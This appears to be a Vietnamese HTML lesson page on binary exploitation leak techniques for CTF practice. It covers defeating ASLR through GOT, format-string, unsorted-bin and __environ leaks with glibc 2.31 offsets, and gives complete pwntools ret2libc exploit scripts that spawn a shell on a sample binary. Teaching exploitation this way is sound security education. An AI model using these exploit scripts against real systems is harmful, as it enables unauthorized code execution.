@@ -1,0 +1,475 @@
+<title>Leak Techniques</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(30px,6.5vw,48px);line-height:1.02;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+.leakid{background:var(--surface-2);border:1px solid var(--line);border-radius:12px;padding:16px;margin:12px 0}
+.leakid .q{font-family:var(--font-mono);font-size:13px;margin-bottom:10px}
+.leakid .opts{display:flex;gap:8px;flex-wrap:wrap}
+.leakid .opts button{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--fg);padding:7px 12px;border-radius:8px;cursor:pointer}
+.leakid .opts button:hover{border-color:var(--accent);color:var(--accent)}
+.leakid .ans{margin-top:12px;font-size:14.5px;border-left:3px solid var(--mem);padding:8px 12px;background:var(--surface);border-radius:0 8px 8px 0;display:none}
+.leakid .ans.show{display:block}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 2 · Bài 6</div>
+    <h1>Leak Techniques</h1>
+    <p class="sub">ASLR random hóa base libc/stack/heap mỗi lần chạy — nhưng <strong>offset nội bộ cố định</strong>. Nên chỉ cần <mark>leak một địa chỉ</mark> là suy ra cả vùng. Bài này tổng hợp các cách leak <strong>có số thật glibc 2.31</strong>: GOT (puts/write), format string, unsorted bin, <code>__environ</code> (leak stack).</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Trung bình (Phase 2)</span>
+      <span class="chip"><b>glibc mẫu:</b> 2.31</span>
+      <span class="chip"><b>Cần trước:</b> PLT/GOT, ASLR</span>
+      <span class="chip"><b>Thời lượng:</b> ~50 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 GOT leak</a><a href="#s4">04 Các leak khác</a><a href="#s5">05 Chẩn đoán</a><a href="#s6">06 Tự tìm</a>
+      <a href="#s7">07 Exploit thật</a><a href="#s8">08 Công cụ</a><a href="#s9">09 Gỡ lỗi</a>
+      <a href="#s10">10 Biến thể</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>Nguyên lý:</strong> leak 1 địa chỉ bất kỳ trong một vùng (libc/stack/heap/elf) → <code>base = leak − offset</code> → biết mọi địa chỉ trong vùng đó.</p>
+    <p><strong>Leak libc:</strong> in địa chỉ thật của một hàm (từ GOT) hoặc con trỏ libc (unsorted fd). <code>libc.base = leak − libc.sym.hàm</code>.</p>
+    <p><strong>Leak stack:</strong> đọc <code>__environ</code> trong libc (chứa con trỏ stack) → biết địa chỉ stack để ghi ret. Leak heap: tcache fd / con trỏ heap in ra.</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>leak = một địa chỉ rò ra; base = leak − offset. Chọn nguồn leak theo primitive bạn có.</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — chọn leak theo thứ bạn có</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">💧 Leak libc — có hàm in (puts/printf)</span>
+<pre><code>ROP: pop_rdi; puts@got; puts@plt   <span class="c"># in địa chỉ thật của puts</span>
+libc.base = leak - libc.sym.puts   <span class="c"># 2.31: - 0x875a0</span></code></pre></div>
+      <div class="combat-row"><span class="lab">💧 Leak libc — format string</span>
+<pre><code>%21$p → 0x7ffff7dcf083 (__libc_start_main+243)
+libc.base = leak - 0x24083</code></pre></div>
+      <div class="combat-row"><span class="lab">💧 Leak libc — heap/unsorted</span>
+<pre><code>free chunk lớn → unsorted → UAF read fd = libc+0x1ecbe0
+libc.base = fd - 0x1ecbe0</code></pre></div>
+      <div class="combat-row"><span class="lab">🧵 Leak STACK — __environ</span>
+<pre><code># sau khi có libc: đọc *(libc.sym.environ) = một địa chỉ stack
+# ret_addr ≈ environ_val - offset (đo bằng gdb)</code></pre></div>
+      <div class="combat-row"><span class="lab">⚠️ Quy tắc</span>
+        <p>Base luôn kết thúc <code>000</code>. Leak dùng libc của ĐỀ (patchelf) → offset đúng. Kết thúc leak bằng quay lại hàm có overflow để tấn công giai đoạn 2.</p></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>ASLR &amp; offset cố định</h2>
+  <p><span class="mem-term">ASLR</span> random hóa <em>base</em> của mỗi vùng nhớ (libc, stack, heap, và PIE binary) mỗi lần chạy. Nhưng <strong>bố cục bên trong mỗi vùng không đổi</strong>: hàm <code>system</code> luôn cách đầu libc một offset cố định. Nên biết <em>một</em> địa chỉ thật trong libc là đủ tính base, rồi suy ra mọi địa chỉ. <span class="mem-term">GOT</span> (Global Offset Table) chứa địa chỉ thật của các hàm libc đã được resolve — đọc GOT = leak.</p>
+  <h4 style="margin-top:8px">Định nghĩa nhanh</h4>
+  <div class="grid">
+    <div class="card"><div class="term">leak</div><p>In/đọc một địa chỉ thật để phá ASLR.</p></div>
+    <div class="card"><div class="term">offset</div><p>Khoảng cách cố định từ base tới hàm.</p></div>
+    <div class="card"><div class="term">GOT</div><p>Bảng địa chỉ thật của hàm (sau resolve).</p></div>
+    <div class="card"><div class="term">__environ</div><p>Biến libc chứa con trỏ stack → leak stack.</p></div>
+    <div class="card"><div class="term">rebase</div><p>base = leak − offset.</p></div>
+    <div class="card"><div class="term">libc.sym</div><p>pwntools: offset hàm trong libc.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>Leak là chìa khóa mở ASLR</h2>
+  <p>Hầu hết khai thác hiện đại cần 2 thành phần: <strong>leak</strong> (biết địa chỉ) + <strong>control</strong> (ghi/nhảy). Mọi mitigation (ASLR, PIE, canary) đều có thể vượt nếu leak đủ: leak libc → ret2libc; leak PIE → biết gadget; leak canary → bỏ qua stack-smashing check; leak stack → ghi ret trực tiếp. Thành thạo "lấy leak từ primitive mình có" là kỹ năng nền của Phase 2 trở đi.</p>
+ </div>
+</section>
+
+<!-- 03 GOT -->
+<section class="block" id="s3">
+ <div class="wrap">
+  <div class="secnum">03 / GOT LEAK · MỤC LÕI</div>
+  <h2>puts(puts@got) / write(1, got, 8)</h2>
+  <figure class="dg">
+  <svg viewBox="0 0 600 110" role="img" aria-label="puts đọc ô GOT chứa địa chỉ thật của puts và in ra, trừ offset ra base libc" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor">
+    <rect x="30" y="38" width="150" height="40" rx="8" stroke-width="1.5"/>
+    <text x="105" y="56" text-anchor="middle" font-size="11" fill="currentColor" stroke="none" font-family="monospace">puts@got (0x404018)</text>
+    <text x="105" y="72" text-anchor="middle" font-size="10" fill="var(--mem)" stroke="none" font-family="monospace">chứa 0x7ffff7e475a0</text>
+    <rect x="240" y="38" width="130" height="40" rx="8" stroke-width="1.5" stroke="#e8663e"/>
+    <text x="305" y="62" text-anchor="middle" font-size="11" fill="#e8663e" stroke="none" font-family="monospace">puts in ra 8 byte</text>
+    <rect x="430" y="38" width="150" height="40" rx="8" stroke-width="1.6" stroke="var(--ok)"/>
+    <text x="505" y="56" text-anchor="middle" font-size="10.5" fill="var(--ok)" stroke="none" font-family="monospace">base = leak</text>
+    <text x="505" y="70" text-anchor="middle" font-size="10" fill="var(--ok)" stroke="none" font-family="monospace">- 0x875a0</text>
+    <line x1="180" y1="58" x2="238" y2="58" stroke-width="1.4"/>
+    <line x1="370" y1="58" x2="428" y2="58" stroke="var(--ok)" stroke-width="1.5"/>
+  </svg>
+  <figcaption>Ô GOT chứa địa chỉ thật của hàm → in ra = leak → trừ offset = base libc.</figcaption>
+  </figure>
+  <h3>Hai cách (số thật 2.31)</h3>
+  <pre><code><span class="c"># puts: dừng ở null byte — địa chỉ libc thường không có null → OK</span>
+ROP: pop_rdi(0x401263); puts@got(0x404018); puts@plt(0x401064); main
+leak = u64(recvline()[:8])          <span class="c"># = 0x7ffff7e475a0</span>
+libc.address = leak - 0x875a0       <span class="c"># libc.sym.puts</span>
+
+<span class="c"># write: in CHÍNH XÁC n byte (không dừng null) — tốt hơn puts khi địa chỉ có null</span>
+ROP: write(1, puts@got, 8)          <span class="c"># cần set rdi=1,rsi=got,rdx=8 (ret2csu?)</span></code></pre>
+  <div class="note tip"><span class="tag">puts vs write</span><code>puts</code> dừng ở byte null → nếu địa chỉ cần leak có null giữa chừng, bị cắt. <code>write(1, addr, 8)</code> in đủ 8 byte (cần set rdx=8 — dùng <a href="ret2csu.html">ret2csu</a> nếu thiếu pop rdx). Với libc address (0x7f...) thường không có null ở 6 byte đầu nên puts OK.</div>
+ </div>
+</section>
+
+<!-- 04 Các leak khác -->
+<section class="block" id="s4">
+ <div class="wrap">
+  <div class="secnum">04 / CÁC NGUỒN LEAK KHÁC</div>
+  <h2>Bảng tổng hợp (số thật 2.31)</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Nguồn</th><th>Leak gì</th><th>Công thức base</th></tr></thead>
+    <tbody>
+      <tr><td>puts(fn@got)</td><td>libc</td><td><code>leak − libc.sym.fn</code></td></tr>
+      <tr><td>fmt <code>%21$p</code></td><td>libc (__libc_start_main+243)</td><td><code>leak − 0x24083</code></td></tr>
+      <tr><td>unsorted fd (UAF)</td><td>libc</td><td><code>leak − 0x1ecbe0</code></td></tr>
+      <tr><td>tcache fd (UAF)</td><td>heap</td><td><code>(leak≪12) hoặc leak</code> (safe-link)</td></tr>
+      <tr><td><code>*__environ</code></td><td>stack</td><td>ret_addr = env − offset (gdb)</td></tr>
+      <tr><td>fmt <code>%N$p</code> (stack)</td><td>stack/PIE/canary</td><td>tùy ô</td></tr>
+      <tr><td>Leak PIE (%p ra 0x55…)</td><td>ELF base</td><td><code>leak − offset_biết</code></td></tr>
+    </tbody>
+  </table></div>
+  <h3>Leak STACK qua __environ (số thật)</h3>
+  <pre><code><span class="c"># sau khi có libc.address: đọc 8 byte tại libc.sym.environ</span>
+<span class="c"># __environ chứa con trỏ tới mảng env TRÊN STACK</span>
+env_ptr = read_mem(libc.sym.environ)   <span class="c"># = 0x7fffffffe3a8 (stack)</span>
+ret_addr = env_ptr - 0x130             <span class="c"># offset đo bằng gdb cho hàm đích</span>
+<span class="c"># → giờ biết địa chỉ stack để ghi ROP trực tiếp</span></code></pre>
+  <div class="note"><span class="tag">Khi nào leak stack</span>Hữu ích khi: PIE + canary nhưng có arbitrary-read (vd fmt %s, UAF) — leak environ để biết stack, rồi ghi ret. Hoặc đề cần ghi vào stack chính xác.</div>
+ </div>
+</section>
+
+<!-- 05 Chẩn đoán -->
+<section class="block" id="s5">
+ <div class="wrap wide">
+  <div class="secnum">05 / TỰ TAY THỬ</div>
+  <h2>Chẩn đoán: bạn có gì → dùng leak nào?</h2>
+  <div class="lab">
+    <div class="leakid" id="leakid">
+      <div class="q">Primitive bạn có là gì?</div>
+      <div class="opts" id="opts">
+        <button data-a="0">Overflow + hàm puts/printf trong PLT</button>
+        <button data-a="1">Format string (%p/%s)</button>
+        <button data-a="2">UAF/heap bug</button>
+        <button data-a="3">Arbitrary read (đọc địa chỉ tùy ý)</button>
+      </div>
+      <div class="ans" id="ans"></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 06 Tự tìm -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>Offset &amp; nhận diện leak</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Nhận diện giá trị leak</h4>
+    <pre><code><span class="c"># 0x7f.... = libc/mmap ; 0x7fff... = stack ; 0x55.... = PIE ; 0x0000...= heap(thấp)</span></code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Tính offset</h4>
+    <pre><code><span class="p">pwndbg&gt;</span> p/x &lt;leak&gt; - libc_base
+<span class="p">&gt;&gt;&gt;</span> libc.sym.puts, libc.sym.environ   <span class="c"># offset qua pwntools</span></code></pre></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>environ → ret offset</h4>
+    <pre><code><span class="p">pwndbg&gt;</span> p/x $rsp_at_ret - *(void**)&amp;__environ   <span class="c"># offset stack</span></code></pre></div></div>
+ </div>
+</section>
+
+<!-- 07 Exploit thật -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / EXPLOIT ĐẦY ĐỦ</div>
+  <h2>GOT leak → ret2libc (số thật 2.31)</h2>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · puts GOT leak</button>
+    <button class="tab" data-t="b">B · __environ stack</button>
+    <button class="tab" data-t="c">C · pwnld</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — leak libc qua puts(puts@got), rebase, rồi system.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+exe  = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+libc = ELF(<span class="s">"./libc.so.6"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+
+OFF = <span class="d">72</span>; pop_rdi = <span class="d">0x401263</span>; ret = <span class="d">0x40101a</span>
+<span class="c"># G1: leak</span>
+p.send(b<span class="s">"A"</span>*OFF + flat(pop_rdi, exe.got.puts, exe.plt.puts, exe.sym.main))
+leak = u64(p.recvline().strip().ljust(<span class="d">8</span>,b<span class="s">"\x00"</span>))
+libc.address = leak - libc.sym.puts      <span class="c"># leak - 0x875a0</span>
+<span class="k">assert</span> libc.address &amp; <span class="d">0xfff</span> == <span class="d">0</span>
+log.success(<span class="s">f"libc = {hex(libc.address)}"</span>)
+<span class="c"># G2: system("/bin/sh")</span>
+binsh = <span class="k">next</span>(libc.search(b<span class="s">"/bin/sh"</span>))
+p.send(b<span class="s">"A"</span>*OFF + flat(ret, pop_rdi, binsh, libc.sym.system))
+p.interactive()</code></pre>
+<div class="note warn"><span class="tag">Thành thật</span><code>OFF=72</code>, <code>pop_rdi=0x401263</code>, <code>ret=0x40101a</code> là của binary mẫu. Offset <code>0x875a0</code> là libc.sym.puts 2.31 — dùng <code>libc.sym</code> để robust. puts dừng null nên libc leak (0x7f…) OK.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b" hidden>
+<pre><code><span class="c"># BẢN B — có libc rồi, leak STACK qua __environ để ghi ret trực tiếp.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+<span class="c"># ... đã có libc.address (từ bản A) và một arbitrary-read (vd puts/fmt) ...</span>
+<span class="k">def</span> leak_mem(addr):
+    p.send(b<span class="s">"A"</span>*OFF + flat(pop_rdi, addr, exe.plt.puts, exe.sym.main))
+    <span class="k">return</span> u64(p.recvline().strip().ljust(<span class="d">8</span>,b<span class="s">"\x00"</span>))
+
+env  = leak_mem(libc.sym.environ)         <span class="c"># con trỏ stack = 0x7fffffffe3a8</span>
+ret_slot = env - <span class="d">0x130</span>                   <span class="c"># offset đo bằng gdb → saved RIP của hàm vuln</span>
+log.success(<span class="s">f"stack ret @ {hex(ret_slot)}"</span>)
+<span class="c"># → giờ có thể ghi ROP vào ret_slot (nếu có arbitrary write)</span>
+p.interactive()</code></pre>
+<div class="note tip"><span class="tag">Leak chuỗi</span>Dùng <code>puts(addr)</code> như "hàm đọc bộ nhớ" tùy ý: mỗi lần leak 1 địa chỉ, quay <code>main</code>. Leak environ → stack. Kết hợp arbitrary-write → ghi ret.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — pwnld.</span>
+<span class="k">from</span> pwnld <span class="k">import</span> *
+context.binary = exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>); libc = get_libc(<span class="s">"./libc.so.6"</span>)
+p = start(); OFF=<span class="d">72</span>; pop_rdi=<span class="d">0x401263</span>; ret=<span class="d">0x40101a</span>
+sl(b<span class="s">"A"</span>*OFF + flat(pop_rdi, exe.got.puts, exe.plt.puts, exe.sym.main))
+rebase_libc(leak=u64(rl().strip().ljust(<span class="d">8</span>,b<span class="s">"\x00"</span>)), sym=<span class="s">"puts"</span>)
+sl(b<span class="s">"A"</span>*OFF + flat(ret, pop_rdi, <span class="k">next</span>(LIBC.search(b<span class="s">"/bin/sh"</span>)), LIBC.sym.system))
+ia()</code></pre>
+<div class="note"><span class="tag">pwnld</span><code>rebase_libc(leak, sym="puts")</code> = base = leak − LIBC.sym.puts. Gọn.</div>
+  </div>
+
+  <h3>Checklist</h3>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Leak ra số lẻ (≠ ...000)</h4><p>Sai offset / đọc nhầm / địa chỉ bị null cắt (dùng write thay puts).</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Local OK remote fail</h4><p>libc remote khác. Nhận diện qua leak (libc-database), patchelf.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>environ offset sai</h4><p>Offset stack đo bằng gdb cho đúng hàm/đề.</p></div></div>
+ </div>
+</section>
+
+<!-- 08 Công cụ -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">libc-database</div><h4>Nhận libc từ leak</h4><p><code>find puts 0x...5a0</code>.</p></div>
+    <div class="card"><div class="term">pwntools libc.sym</div><h4>Offset hàm</h4><p>puts/system/environ.</p></div>
+    <div class="card"><div class="term">patchelf</div><h4>Chạy đúng libc</h4><p>--replace-needed.</p></div>
+    <div class="card"><div class="term">gdb vmmap</div><h4>Base vùng</h4><p>Kiểm libc/stack base.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Gỡ lỗi -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / GỠ LỖI</div>
+  <h2>Khi leak sai</h2>
+  <div class="grid">
+    <div class="card"><h4>Base ≠ ...000</h4><p>Sai offset hoặc đọc nhầm dòng.</p></div>
+    <div class="card"><h4>Địa chỉ null cắt (puts)</h4><p>Dùng write(1,addr,8).</p></div>
+    <div class="card"><h4>libc sai version</h4><p>libc-database + patchelf.</p></div>
+    <div class="card"><h4>environ = 0</h4><p>Chưa có libc base đúng, hoặc đọc sai địa chỉ.</p></div>
+    <div class="card"><h4>fmt offset sai</h4><p>Dò lại %N$p.</p></div>
+    <div class="card"><h4>PIE leak nhầm</h4><p>0x55… là PIE, 0x7f… là libc. Phân biệt đúng.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Biến thể -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / BIẾN THỂ & NHẬN DIỆN</div>
+  <h2>Mỗi mitigation cần leak gì</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Mitigation</th><th>Leak cần</th></tr></thead>
+    <tbody>
+      <tr><td>ASLR (libc)</td><td>1 địa chỉ libc (GOT/unsorted/fmt)</td></tr>
+      <tr><td>PIE</td><td>1 địa chỉ ELF (0x55…) → base binary</td></tr>
+      <tr><td>Canary</td><td>Giá trị canary (fmt %p / overflow-read)</td></tr>
+      <tr><td>Full ASLR + ghi ret</td><td>__environ → stack</td></tr>
+    </tbody>
+  </table></div>
+  <div class="note"><span class="tag">x86 (32-bit)</span>Địa chỉ 4 byte (<code>u32</code>). libc 0xf7…, stack 0xff…. Offset libc 32-bit khác. environ tương tự.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập tăng dần</h2>
+  <div class="ex"><div class="level">⭐⭐ · puts GOT leak</div><p>Leak libc qua puts(puts@got), rebase, system.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐ · write leak (có null)</div><p>Địa chỉ có null: dùng write(1,got,8) thay puts.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐ · environ → stack</div><p>Leak environ, tính ret_slot, ghi ROP vào stack.</p></div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">leak</div><p>In/đọc địa chỉ thật.</p></div>
+    <div class="card"><div class="term">offset</div><p>Khoảng cách cố định tới base.</p></div>
